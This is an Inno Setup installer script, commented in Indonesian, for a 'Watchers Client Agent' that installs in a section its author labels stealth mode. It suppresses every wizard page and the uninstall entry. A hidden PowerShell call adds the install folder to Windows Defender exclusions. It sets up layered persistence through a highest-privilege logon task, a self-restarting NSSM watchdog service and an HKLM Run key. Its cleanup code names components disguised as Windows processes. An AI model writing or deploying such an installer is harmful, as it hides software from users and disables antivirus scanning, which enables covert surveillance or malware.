[Setup]
AppName=Watchers Client Agent
AppVersion=1.0.0
AppPublisher=Watchers Security
DefaultDirName={commonappdata}\WatchersAgent
OutputBaseFilename=WatchersAgent_SetupV12
Compression=lzma2/ultra64
SolidCompression=yes
PrivilegesRequired=admin
ArchitecturesInstallIn64BitMode=x64

; ================================================================
; KONFIGURASI TERSEMBUNYI (STEALTH MODE) & PENGUNCIAN PATH
; ================================================================
CreateUninstallRegKey=no
DisableDirPage=yes
DisableProgramGroupPage=yes
DisableWelcomePage=yes
DisableReadyPage=yes
DisableFinishedPage=yes

[Files]
; Salin seluruh komponen aplikasi dari folder dist (termasuk nssm.exe & WatchdogWatchers.exe)
Source: "dist\WatchersAgent\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "vc_redist.x64.exe"; DestDir: "{tmp}"; Flags: deleteafterinstall

[Run]
; 1. Instalasi VC++ Redistributable jika belum ada
Filename: "{tmp}\vc_redist.x64.exe"; Parameters: "/install /passive /norestart"; Check: not IsVCRedistInstalled; StatusMsg: "Menginstal Microsoft Visual C++..."; Flags: waituntilterminated

; 2. Tambahkan Exclusion Path ke Windows Defender
Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -NoProfile -Command Add-MpPreference -ExclusionPath '{app}'"; Flags: runhidden

; 3. Daftarkan Task Scheduler AGENT UTAMA (Berjalan di Session 1 User Logon)
Filename: "schtasks.exe"; Parameters: "/create /tn ""WatchersAgentTask"" /tr ""'{app}\WatchersAgent.exe'"" /sc onlogon /rl highest /f"; Flags: runhidden

; 4. DAFTARKAN WATCHDOG SEBAGAI WINDOWS SERVICE MENGGUNAKAN NSSM (NAMA DEFAULT)
Filename: "{app}\nssm.exe"; Parameters: "install WatchersWatchdog ""{app}\WatchdogWatchers.exe"""; Flags: runhidden
Filename: "{app}\nssm.exe"; Parameters: "set WatchersWatchdog DisplayName ""Watchers Watchdog Service"""; Flags: runhidden
Filename: "{app}\nssm.exe"; Parameters: "set WatchersWatchdog Description ""Memastikan WatchersAgent tetap berjalan di background."""; Flags: runhidden
Filename: "{app}\nssm.exe"; Parameters: "set WatchersWatchdog Start SERVICE_AUTO_START"; Flags: runhidden
Filename: "{app}\nssm.exe"; Parameters: "set WatchersWatchdog AppExit Default Restart"; Flags: runhidden
Filename: "{app}\nssm.exe"; Parameters: "start WatchersWatchdog"; Flags: runhidden

; 5. Daftarkan ke Windows Startup Registry (Backup Garansi Session 1 saat User Login)
Filename: "reg.exe"; Parameters: "add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""WatchersAgentAuto"" /t REG_SZ /d ""\""{app}\WatchersAgent.exe\"""" /f"; Flags: runhidden

; 6. Jalankan Agent Utama Seketika di Session 1 User
Filename: "schtasks.exe"; Parameters: "/run /tn ""WatchersAgentTask"""; Flags: runhidden

[Code]
// ================================================================
// Check VC++ Installed
// ================================================================
function IsVCRedistInstalled: Boolean;
var
  Installed: Cardinal;
begin
  Result := RegQueryDWordValue(HKLM, 'SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64', 'Installed', Installed) and (Installed = 1);
  if not Result then
    Result := RegQueryDWordValue(HKLM, 'SOFTWARE\WOW6432Node\Microsoft\VisualStudio\14.0\VC\Runtimes\x64', 'Installed', Installed) and (Installed = 1);
end;

// ================================================================
// FUNGSI PEMBERSIHAN UTAMA (SERVICE, TASK, REGISTRY, PROSES)
// ================================================================
procedure StopAndCleanupEverything();
var
  ResultCode: Integer;
begin
  // 1. Hentikan & hapus Service NSSM (Nama default & nama lama jika ada)
  Exec('net.exe', 'stop WatchersWatchdog', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('sc.exe', 'delete WatchersWatchdog', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('net.exe', 'stop WinSecurityBroker', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('sc.exe', 'delete WinSecurityBroker', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // 2. Hapus Task Scheduler
  Exec('schtasks.exe', '/delete /tn "WatchersAgentTask" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('schtasks.exe', '/delete /tn "WatchersWatchdogTask" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('schtasks.exe', '/delete /tn "WinSecurityBrokerTask" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // 3. Hapus Auto-Run Registry Windows
  Exec('reg.exe', 'delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WatchersAgentAuto" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // 4. MATIKAN SEMUA PROSES SEKALIGUS DALAM 1 BARIS PERINTAH
  Exec('taskkill.exe', '/F /T /IM WatchdogWatchers.exe /IM WatchersAgent.exe /IM RuntimeBrokerHost.exe /IM nssm.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // 5. Jeda 1.5 detik agar Windows OS melepaskan File Handle Lock pada file .exe
  Sleep(1500);
end;

// ================================================================
// DIJALANKAN SAAT INSTALLER (.EXE) BARU DIBUKA (BEFORE INSTALL)
// ================================================================
function InitializeSetup(): Boolean;
var
  AppDir: string;
  ResultCode: Integer;
begin
  Result := True;
  
  // Bersihkan proses dan service lama yang sedang berjalan
  StopAndCleanupEverything();

  // Hapus sisa folder lama jika ada file yang korup
  AppDir := ExpandConstant('{commonappdata}\WatchersAgent');
  if DirExists(AppDir) then
  begin
    Exec('cmd.exe', '/c rmdir /s /q "' + AddQuotes(AppDir) + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  end;
end;

// ================================================================
// DIJALANKAN SAAT UNINSTALLER DIBUKA (BEFORE UNINSTALL)
// ================================================================
function InitializeUninstall(): Boolean;
begin
  Result := True;
  
  // Hentikan seluruh proses, service, dan task sebelum Windows mulai menghapus file
  StopAndCleanupEverything();
end;

// ================================================================
// DIJALANKAN SETELAH UNINSTALL SELESAI (POST UNINSTALL)
// ================================================================
procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
var
  AppDir: string;
  ResultCode: Integer;
begin
  if CurUninstallStep = usPostUninstall then
  begin
    AppDir := ExpandConstant('{commonappdata}\WatchersAgent');
    
    // Sapu bersih folder instalasi C:\ProgramData\WatchersAgent hingga tak tersisa
    if DirExists(AppDir) then
    begin
      Exec('cmd.exe', '/c rmdir /s /q "' + AddQuotes(AppDir) + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    end;
  end;
end;